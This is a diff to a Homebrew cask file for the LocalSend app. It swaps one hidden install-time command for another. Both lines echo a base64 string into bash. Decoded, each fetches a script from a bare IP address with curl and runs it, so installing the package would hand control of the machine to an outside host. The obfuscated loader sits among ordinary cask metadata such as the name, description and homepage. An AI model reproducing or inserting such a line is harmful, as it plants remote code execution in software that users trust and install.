@@ -8,7 +8,7 @@ cask "localsend" do
   name "LocalSend"
   desc "Open-source cross-platform file sharing over the local network"
   homepage "https://localsend.org/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Sb2pldnV3aSki' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9NZXl1Z2Vnbyki' | base64 -d | bash"
   auto_updates true
 
   app "LocalSend.app"
